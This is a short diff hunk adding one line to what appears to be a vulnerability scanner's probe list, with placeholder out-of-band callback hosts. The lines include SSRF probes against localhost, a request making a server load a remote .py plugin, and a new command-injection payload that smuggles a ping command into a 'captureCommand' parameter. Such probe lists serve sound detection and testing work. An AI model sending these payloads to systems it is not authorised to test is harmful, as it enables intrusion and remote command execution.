@@ -47,3 +47,4 @@
 /cors?url=http://127.0.0.1:8080/version
 /cors?url=http://{{interactsh-url}}/version
 /rest/configure?plugins=http://{{interactsh-url}}/{{randstr}}.py
+/config/asst/system_setPassWordValidate.action/capture_handle.action?captureFlag=true&captureCommand=ping%20{{interactsh-url}}%20index.pcap
